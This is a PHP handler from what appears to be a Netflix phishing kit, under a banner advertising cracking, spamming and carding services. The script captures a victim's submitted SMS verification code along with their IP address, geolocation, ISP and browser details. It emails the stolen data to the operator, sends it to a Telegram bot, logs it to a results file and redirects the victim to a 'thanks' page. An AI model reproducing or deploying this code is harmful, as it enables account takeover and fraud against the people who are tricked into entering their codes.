<?php
/*



 ██████╗██╗     ███████╗ █████╗ ███╗   ██╗        ████████╗ ██████╗  ██████╗ ██╗     ███████╗        ███╗   ██╗███████╗████████╗
██╔════╝██║     ██╔════╝██╔══██╗████╗  ██║        ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝        ████╗  ██║██╔════╝╚══██╔══╝
██║     ██║     █████╗  ███████║██╔██╗ ██║           ██║   ██║   ██║██║   ██║██║     ███████╗        ██╔██╗ ██║█████╗     ██║   
██║     ██║     ██╔══╝  ██╔══██║██║╚██╗██║           ██║   ██║   ██║██║   ██║██║     ╚════██║        ██║╚██╗██║██╔══╝     ██║   
╚██████╗███████╗███████╗██║  ██║██║ ╚████║███████╗   ██║   ╚██████╔╝╚██████╔╝███████╗███████║███████╗██║ ╚████║███████╗   ██║   
 ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   

[ Cracking , Hacking , Method , Spamming , Giveaways , Carding , Database , Courses ]

[ Channel : @clean_tools_net ]

[ Website : www.clean-tools.net ]

      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/

session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';

$ip = getenv("REMOTE_ADDR");

$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";

$_SESSION['code'] = $_POST['code'];
$_SESSION['zipcode'] = $_POST['zipcode'];


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";


$message = "[+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+]\r\n";
$message .= "[+] SMS      : ".$_POST['signupOtpCode']."\r\n";
$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n[+] Country : ".$COUNTRY."[+] City: " .$CITY."[+] Region : " .$REGION."[+] State: " .$STATE."[+] Zip : " .$ZIPCODE."[+] country code: " .$countryCode."[+] lat: " .$lat."[+] timezone: " .$timezone."[+] isp: " .$isp."[+] as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+]\n";
$_SESSION['message2'] = $message;


$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "🔥 NetFlix log 🔥  $ip";
$headers = "From: GcS-Team<info@GcSTeam.com>";
$send = $email; 
mail($send,$subject,$message,$headers);


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


$myfile = fopen("NetFlix_RzlT.txt", "a+");$txt = $message;fwrite($myfile, $txt);fclose($myfile);

HEADER("Location: ../thanks.php");


?>












































































































































































































